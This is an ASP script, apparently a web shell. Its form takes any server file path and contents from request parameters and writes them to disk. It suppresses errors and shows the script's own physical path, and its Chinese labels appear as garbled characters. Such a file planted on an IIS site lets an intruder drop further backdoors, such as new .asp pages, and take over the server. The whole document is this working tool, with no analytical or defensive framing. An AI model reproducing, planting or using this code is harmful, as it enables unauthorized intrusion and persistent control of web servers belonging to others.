<%dim FSOFIL%>
<%dim FILdata%>
<%dim CountFil%>
<%on error resume next%>
<%Set FSOFIL = Server.CreateObject("Scripting.FileSystemObject")%>
<%if Trim(request("syfdpath"))<>"" then%>
<%FILdata = request("cyfddata")%>
<%Set CountFil=FSOFIL.CreateTextFile(request("syfdpath"),True)%>
<%CountFil.Write FILdata%>
<%if err =0 then%>
<%response.write "<font color=red>save Success!</font>"%>
<%else%>
<%response.write "<font color=red>Save UnSuccess!</font>"%>
<%end if%>
<%err.clear%>
<%end if%>
<%CountFil.Close%>
<%Set CountFil=Nothing%>
<%Set FSOFIL = Nothing%>
<%Response.write "<form action='''' method=post>"%>
<%Response.write "�����ļ���<font color=red>����·��(�����ļ���:��D:\web\x.asp):</font>"%>
<%Response.Write "<input type=text name=syfdpath width=32 size=50>"%>
<%Response.Write "<br>"%>
<%Response.write "���ļ�����·��"%>
<%=server.mappath(Request.ServerVariables("SCRIPT_NAME"))%>
<%Response.write "<br>"%>
<%Response.write "�����������:"%>
<%Response.write "<textarea name=cyfddata cols=80 rows=10 width=32></textarea>"%>
<%Response.write "<input type=submit value=����>"%>
<%Response.write "</form>"%>